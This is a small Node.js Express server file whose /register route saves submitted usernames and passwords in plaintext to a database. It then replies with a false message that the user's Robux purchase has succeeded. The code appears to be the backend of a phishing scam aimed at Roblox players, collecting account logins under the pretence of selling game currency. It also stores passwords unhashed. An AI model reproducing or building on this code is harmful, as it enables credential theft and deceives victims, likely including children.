const express = require("express");
const db = require("./db");

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.urlencoded({ extended: true }));
app.use(express.json());

app.use(express.static("public"));

app.post("/register", (req, res) => {
    const { username, password } = req.body;

    const query = "INSERT INTO users (username, password) VALUES (?, ?)";

    db.query(query, [username, password], (err, result) => {
        if (err) {
            console.log("DB Error:", err);
            return res.status(500).send("Database error");
        }

        res.status(200).send("Your Robux has been successfully purchased and you will get it in a few days");
    });
});

app.listen(PORT, () => {
    console.log("Your server is running on http://localhost:3000");
});
